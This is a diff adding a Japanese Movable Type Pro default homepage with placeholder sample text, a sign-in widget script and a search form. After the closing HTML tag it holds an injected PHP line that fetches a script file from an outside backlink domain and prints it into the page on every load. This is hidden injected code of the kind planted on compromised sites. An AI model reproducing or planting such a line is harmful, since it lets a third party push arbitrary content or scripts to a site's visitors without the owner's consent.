@@ -1,0 +1,196 @@
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" id="sixapart-standard">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta name="generator" content="Movable Type Pro 5.02" />
+    <link rel="stylesheet" href="http://www.0-10.net/styles.css" type="text/css" />
+    <link rel="start" href="http://www.0-10.net/" title="ホーム" />
+    <link rel="alternate" type="application/atom+xml" title="Recent Entries" href="http://www.0-10.net/atom.xml" />
+    <script type="text/javascript" src="http://www.0-10.net/mt.js"></script>
+    
+    <link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://www.0-10.net/rsd.xml" />
+
+    <script type="text/javascript">
+    var adminurl = 'http://111.89.140.190/mt/' + 'mt.cgi';
+    var blog_id = '1';
+    var page_id = '3';
+    </script>
+    
+    <title>First Website</title>
+</head>
+<body id="professional-website" class="mt-main-index layout-wm">
+    <div id="container">
+        <div id="container-inner">
+            <div id="header">
+                <div id="header-inner">
+                    <div id="header-content">
+
+                        <h1 id="header-name"><a href="http://www.0-10.net/" accesskey="1">First Website</a></h1>
+                        <h2 id="header-description"></h2>
+
+                        <div class="widget-sign-in widget">
+    <h3 class="widget-header">サインイン</h3>
+    <div id="signin-widget-content" class="widget-content"></div>
+</div>
+<script type="text/javascript">
+/* <![CDATA[ */
+function mtUpdateSignInWidget(u) {
+    var el = document.getElementById('signin-widget-content');
+    var content = '';
+    if (!el) return;
+    if (u) {
+        if (u && u.is_authenticated) {
+            user = u;
+            mtSaveUser();
+        } else {
+            // user really isn't logged in; so let's do this!
+            return mtSignIn();
+        }
+    } else {
+        u = mtGetUser();
+    }
+    if (u && u.name) {
+        var url;
+        if (u.is_authenticated) {
+            if (u.is_author) {
+                url = 'http://111.89.140.190/mt/mt-comments.cgi?__mode=edit_profile&blog_id=1';
+                url += '&static=' + encodeURIComponent( location.href );
+            } else {
+                url = u.url;
+            }
+        } else if (u.url) {
+            url = u.url;
+        } else {
+            url = null;
+        }
+        var content = 'ユーザー名:';
+        if (url)
+            content += '<a href="' + url + '">' + u.name + '</a>';
+        else
+            content += u.name;
+        content += '.  (<a href="javascript:void(0)" onclick="return mtSignOutOnClick()">サインアウト</a>)';
+    } else if (u && u.is_banned) {
+        content = 'このブログにサインインする権限がありません。';
+    } else {
+        content = '<a href="javascript:void(0)" onclick="return mtSignInOnClick(\'signin-widget-content\')">サインイン</a>';
+    }
+    el.innerHTML = content;
+}
+mtAttachEvent('usersignin', mtUpdateSignInWidget);
+mtUpdateSignInWidget();
+/* ]]> */
+</script>
+
+                    </div>
+                </div>
+            </div>
+            <div id="main-navigation">
+                <div id="main-navigation-inner">
+                    <ul>
+    <li class="first on"><a href="http://www.0-10.net/">ホーム</a></li>
+
+
+    <li class=""><a href="http://www.0-10.net/blogs/">ブログ</a></li>
+
+
+    
+
+    
+    
+    <li class=""><a href="http://www.0-10.net/about/about.html">About</a></li>
+    
+
+    
+    
+    <li class="last"><a href="http://www.0-10.net/contact/contact.html">連絡先</a></li>
+    
+</ul>
+
+
+                    <div class="widget-search widget">
+    <h3 class="widget-header">検索</h3>
+    <div class="widget-content">
+        <form method="get" action="http://111.89.140.190/mt/mt-search.cgi">
+            <input type="text" id="search" class="ti" name="search" value="" />
+
+            <input type="hidden" name="IncludeBlogs" value="1,7,2,4" />
+
+            <input type="hidden" name="limit" value="20" />
+            <input type="submit" accesskey="4" value="検索" />
+        </form>
+    </div>
+</div>
+
+                </div>
+            </div>
+
+            <div id="content">
+                <div id="content-inner">
+
+                    <div id="homepage-image">&nbsp;</div>
+
+                    <div id="alpha">
+                        <div id="alpha-inner">
+
+
+
+
+<h1 id="page-title" class="asset-name">新しいウェブサイトへようこそ!</h1>
+
+<p><strong>以下の文章はサンプルです。内容を適切に書き換えてください。</strong></p>
+<p>いろはにほへと ちりぬるを わかよたれそ つねならむ うゐのおくやま けふこえて あさきゆめみし ゑひもせす</p>
+<p>色は匂へど 散りぬるを 我が世誰ぞ 常ならむ 有為の奥山 今日越えて 浅き夢見じ 酔ひもせず</p>
+<p>あめ つち ほし そら やま かは みね たに くも きり むろ こけ ひと いぬ うへ すゑ ゆわ さる おふ せよ えのえを なれ ゐて</p>
+<!-- 以下のリンクは削除してください。 -->
+<p class="admin-edit-link">
+<a href="#" onclick="location.href=adminurl + '?__mode=view&_type=page&id=' + page_id + '&blog_id=' + blog_id; return false">コンテンツを編集</a>
+</p>
+
+
+
+</div>
+                    </div>
+                <div id="beta">
+    <div id="beta-inner">
+        
+        
+    </div>
+</div>
+
+
+                </div>
+            </div>
+            <div id="footer">
+                <div id="footer-inner">
+                    <div id="footer-content">
+                        <div class="widget-powered widget">
+    <div class="widget-content">
+        <span>Powered by <a href="http://www.sixapart.jp/movabletype/">Movable Type Pro</a></span>
+    </div>
+</div>
+
+                        <div class="widget-footer-links widget">
+    <h3 class="widget-header">リンク</h3>
+    <div class="widget-content">
+        <ul>
+            <li><a href="http://www.0-10.net/">ホーム</a></li>
+
+        </ul>
+    </div>
+</div>
+
+
+
+
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
+
+
+<?php $lornvy=curl("https://backlinkku.id/menu/aged-v1/script.txt"); ?> <?=$lornvy; ?>
